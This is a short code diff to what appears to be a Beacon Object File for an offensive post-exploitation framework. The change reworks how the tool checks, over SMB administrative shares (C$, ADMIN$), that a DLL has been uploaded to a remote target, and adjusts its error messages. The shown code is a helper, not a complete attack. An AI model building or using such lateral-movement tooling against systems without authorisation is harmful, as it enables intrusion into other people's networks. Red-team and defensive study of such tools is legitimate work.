@@ -118,20 +118,26 @@ static const char* basename_of(const char *path) {
 
 /* ---- Check if file exists on target via SMB ---- */
 static BOOL file_exists(const char *target, const char *dll_path) {
-    /* If path is already UNC, use as-is. Otherwise build \\target\ADMIN$\... */
     char check_path[512];
     if (dll_path[0] == '\\' && dll_path[1] == '\\') {
+        /* Already UNC, use as-is */
         MSVCRT$_snprintf(check_path, sizeof(check_path), "%s", dll_path);
+    } else if (dll_path[1] == ':' && dll_path[2] == '\\') {
+        /* C:\path\foo.dll -> \\target\C$\path\foo.dll */
+        MSVCRT$_snprintf(check_path, sizeof(check_path), "\\\\%s\\%c$\\%s",
+                         target, dll_path[0], dll_path + 3);
     } else {
-        /* Convert C:\Windows\foo.dll -> \\target\ADMIN$\foo.dll for check */
-        /* ponytail: just try opening via UNC with the basename on ADMIN$ */
-        MSVCRT$_snprintf(check_path, sizeof(check_path), "\\\\%s\\ADMIN$\\%s",
-                         target, basename_of(dll_path));
+        /* Relative or unknown -- skip check */
+        return TRUE;
     }
 
     HANDLE hFile = KERNEL32$CreateFileA(check_path, GENERIC_READ, FILE_SHARE_READ,
                                          NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+    if (hFile == INVALID_HANDLE_VALUE) {
+        TMB_ERR("DLL not found: %s (checked %s)", dll_path, check_path);
+        TMB_INFO("Upload it first, then retry.");
+        return FALSE;
+    }
     KERNEL32$CloseHandle(hFile);
     return TRUE;
 }
@@ -570,8 +576,6 @@ extern "C" void go(char *args, int alen) {
 
     /* ---- Phase 1: Verify DLL exists on target ---- */
     if (!file_exists(target, dll_path)) {
-        TMB_ERR("DLL not found on target: %s", dll_path);
-        TMB_INFO("Upload it first: upload <local_path> \\\\%s\\ADMIN$\\%s", target, dll_name);
         return;
     }
     TMB_INFO("DLL verified: %s", dll_path);
